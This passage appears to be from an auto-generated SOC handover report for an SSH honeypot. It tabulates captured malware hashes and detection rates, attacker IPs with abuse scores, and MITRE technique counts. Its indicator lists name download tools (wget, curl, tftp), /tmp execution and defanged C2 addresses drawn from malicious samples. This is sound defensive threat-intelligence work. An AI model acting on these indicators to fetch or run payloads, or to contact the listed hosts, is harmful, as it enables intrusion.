| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `182.13.96[.]129` | ID | PT. Telekomunikasi Selular (Telkomsel) Indonesia | **100** ⚠️ | 28 |
| `151.243.11[.]233` | DE | LLC VASH KREDIT BANK | **100** ⚠️ | 20 |
| `91.92.47[.]55` | BG | TechTies Inc. | **100** ⚠️ | 9 |
| `2.57.122[.]209` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `161.132.47[.]68` | PE | Red Cientifica Peruana | **100** ⚠️ | 7 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `222.189.183[.]188` | CN | CHINANET jiangsu province network | **100** ⚠️ | 0 |
| `165.1.75[.]106` | US | Oracle Corporation | **100** ⚠️ | 0 |
| `182.66.193[.]212` | IN | Bharti Airtel Limited | **100** ⚠️ | 0 |
| `45.79.207[.]111` | US | Linode | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 238 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 203 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 46 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 45 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 45 |

---

## 🔕 False Positive Summary (45 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 3 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 39 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 486 cases |
| Tool 34  | Credential Extractor        | ✅ 244 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 10 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 124 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 45 filtered (9.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 75 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 33 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 202 priority case(s) shown individually · 35 recon entry/entries in table (9 group(s) consolidating 213 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-15T10:07:27Z_
